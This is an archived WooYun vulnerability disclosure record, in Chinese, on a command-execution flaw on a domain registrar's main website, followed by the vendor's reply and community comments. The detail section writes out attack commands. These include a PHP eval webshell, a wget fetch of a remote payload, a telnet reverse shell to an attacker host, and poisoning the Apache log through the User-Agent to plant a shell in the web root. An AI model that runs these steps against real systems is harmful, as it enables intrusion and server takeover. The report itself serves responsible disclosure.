{"id": 10785, "wybug_id": "wooyun-2013-026945", "wybug_title": "新网互联主站命令执行漏洞主站沦陷（非struts漏洞）", "wybug_corp": "北京新网互联科技有限公司", "wybug_author": "瞌睡龙", "wybug_date": "2013-06-26 12:28", "wybug_open_date": "2013-08-10 12:28", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-10：\t细节向公众公开  简要描述： 主站的命令执行~嗷 详细说明：  一处犀利的命令执行\n\npwd看向当前网站路径：/home/member/www/live/domainv2 找是否有可写目录：\n\n果断写shell啊echo \"<?php eval(\\$_POST[l])?>\" > /home/member/www/live/upload/111.php cat下看看cat /home/member/www/live/upload/111.php \n\n妈蛋的什么都没有，什么情况，可能有特殊字符过滤了，继续黑盒测试。换wget再试试：wget http://bluetest.duapp.com/eval.txt -O /home/member/www/live/upload/zzz.php依然失败。linux一条命令直接反弹端口回来试下：telnet x.x.x.x 1111 | /bin/sh | telnet x.x.x.x 2222\n\n发现弹回来了，但是会马上断开连接，后来才知道FreeBSD的是Unix的不支持这种。。。\n\n把shell写进系统里，然后mv到web目录下试试~试一下apache日志的方式进程中找到apache的路径ps -aux找到apache配置文件cat /usr/local/apache/conf/httpd.conf找到日志地址 tail -100 /usr/local/apache/logs/access_log \n\n把浏览器UA改成 <?php eval($_POST[l]);?>然后tail几遍看看日志\n\n干的漂亮，导出到web目录试试~tail -1000 /usr/local/apache/logs/access_log > /home/member/www/live/upload/a.php访问一下a.php： \n\n一句话连接http://www.dns.com.cn/upload/a.php\n\n你也可以试下grep出eval来导出大小会小很多，不过1000行还好~看了下/var/log目录下的一些日志文件：检查新生成php文件/var/log/find_new_php.log 检查危险函数/var/log/check_dangerous.log 监控做的挺好，但是检查出的那么多危险函数怎么就不管了呢~   漏洞证明：     修复方案：  正则匹配严格些，逻辑上别出问题。   版权声明：转载请注明来源 瞌睡龙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-06-27 09:26 厂商回复： 问题已经确认，并修复了。太郁闷了，2次死在同一个沟里。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-26 12:32 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  岂不是又可以劫持土豆了？    \n     2013-06-26 12:33 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  非struts...亮了    \n     2013-06-26 12:34 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  围观    \n     2013-06-26 12:35 |    \t\tHuGtion \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 学习安全技术。)\t\t \n  新网互联....    \n     2013-06-26 12:36 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  @Finger 土豆怎么还没有域名转移    \n     2013-06-26 12:42 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @专业种田 这个你得问土豆    \n     2013-06-26 12:43 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  万网、新网、时代互联、新网互联  下一个会是谁？    \n     2013-06-26 13:15 |    \t\t╰╃清風 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:9        | 这家伙很懒，什么都没有留下)\t\t \n  亮了    \n     2013-06-26 13:18 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  菇凉，菇凉，你真棒！    \n     2013-06-26 13:30 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:14        | 灰色轨迹)\t\t \n  又能淫荡一下了    \n     2013-06-26 14:19 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  龙哥好牛逼    \n     2013-06-26 14:46 |    \t\t8点半 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 你当哥是CPU啊，人生价值就是执行指令?)\t\t \n  睡觉了    \n     2013-06-26 15:03 |    \t\t紫气东来 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:1        | xxx)\t\t \n  非struts漏洞？如果说是的j2ee应用的话，不是struts2框架，那只有webwork或spring了，或者使用了OGNL的web框架。我猜是webwork框架，它的漏洞一直被struts2所掩盖了！    \n     2013-06-26 15:53 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  哇哦，又可以劫持了？    \n     2013-06-26 16:28 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @redrain有节操 为什么要说又呢    \n     2013-06-26 17:25 |    \t\t慕林 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:1        | 好钻研， 爱安全)\t\t \n  @紫气东来  这个新网互联跟新网是不是一回事？     \n     2013-06-26 17:54 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  洞主大大---mark    \n     2013-06-27 00:56 |    \t\tBlackeagle \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:10        | 向WooYun致敬)\t\t \n  @Finger 要不。。中国互联    \n     2013-06-27 13:03 |    \t\t优酷(乌云厂商)\t\t \n  新网是国内出名的只许进不许出，你想转移哪有那么容易.....    \n     2013-06-27 13:04 |    \t\tdyun \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:15        | [code][/code])\t\t \n  @优酷 后悔了吧...    \n     2013-06-27 16:30 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @优酷 国内域名注册商都差不多 不用转来转去的了 没意义    \n     2013-06-27 18:06 |    \t\tSct7p \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 懂与不懂之间只隔了一层纸，懂的人会觉得很...)\t\t \n  @新网互联 其实这些大企业的域名可以给他们提供\"特殊服务\",尽量让数据不要裸奔在网上    \n     2013-06-27 23:58 |    \t\tAepl│恋爱 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:15        | Forzen恋爱-不要做你的Guest 只想做的你adm...)\t\t \n  @新网互联 @Sct7p 你看吧 经过土豆的事情 这些大企业域名会慢慢转出的    \n     2013-06-28 11:45 |    \t\tSct7p \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 懂与不懂之间只隔了一层纸，懂的人会觉得很...)\t\t \n  @Aepl│恋爱 万网的域名认证机制还是比较完善的。要选就选万网吧。认证机制特别复杂    \n     2013-06-28 14:10 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  新网互联的礼物已收到 很不错 谢啦    \n     2013-06-28 17:02 |    \t\tLeon \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 永无宁日啊)\t\t \n  @Finger 呵呵 这么快，    \n     2013-06-28 18:10 |    \t\tSct7p \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 懂与不懂之间只隔了一层纸，懂的人会觉得很...)\t\t \n  @Finger 我也收到了不错    \n     2013-07-17 09:38 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  膜拜高手，求带啊~    \n     2013-07-17 11:05 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  域名查询处还能这样，服了。    \n     2013-07-27 10:54 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  这里还能命令执行，什么样的逻辑，直接nslookup了？后面的分析也很精彩。    \n     2013-07-29 15:37 |    \t\tlion(lp) \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:14        | 本人菜。。。千年实习白帽子)\t\t \n  牛逼～～ 佩服    \n     2013-07-30 05:24 |    \t\t78基佬 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:20        | 不会日站的设计师不是好产品经理)\t\t \n  这思路牛逼    \n     2013-08-10 12:40 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  我去，高端大气    \n     2013-08-10 13:33 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  这种低级漏洞很多WHOIS、Looking Glass程序都出现过。    \n     2014-03-09 11:15 |    \t\tc4bbage \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:7        | var_dump($me);)\t\t \n  佩服    \n     2014-05-09 12:37 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  无语，这个漏洞花了好多的文章，不错！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}